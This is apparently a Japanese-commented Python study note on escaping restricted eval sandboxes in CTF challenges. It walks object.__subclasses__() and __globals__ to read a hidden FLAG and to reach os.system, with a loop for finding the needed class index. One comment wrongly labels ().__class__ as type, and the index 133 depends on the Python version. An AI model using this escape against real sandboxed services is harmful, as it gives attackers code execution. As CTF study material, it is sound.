# *************************************************************
# 継承関係の理解
# *************************************************************
class A:
    pass


class B(A):
    pass


assert B.__base__ == A
assert B in A.__subclasses__()

().__class__  # <class 'type'>
().__class__.__base__  # <class 'object'>
().__class__.__base__.__subclasses__()  # [<class 'type'>, <class 'weakref'>, ...]

assert A in ().__class__.__base__.__subclasses__()
# object -> A -> B


# *************************************************************
# globals や locals を消されても、object から辿って取得できる
# *************************************************************
FLAG = "flag{...}"


class A:
    def __init__(self):
        pass


# 問題
# while True:
#     print(eval(input(">>> "), {"__builtins__": {}}, {}))

# 解答例
command = "().__class__.__base__.__subclasses__()[-1].__init__.__globals__['FLAG']"
assert eval(command, {"__builtins__": {}}, {}) == "flag{...}"


# *************************************************************
# object を辿って os.system を呼び出す
# *************************************************************
# <class 'os._wrap_close'> を見つける
print(().__class__.__base__.__subclasses__()[133])
# globals に system がある
print(().__class__.__base__.__subclasses__()[133].__init__.__globals__["system"])

# index の見つけ方
classes = ().__class__.__base__.__subclasses__()
for c in classes:
    if "__globals__" in c.__init__.__dir__():
        if "system" in c.__init__.__globals__:
            print(classes.index(c), c)
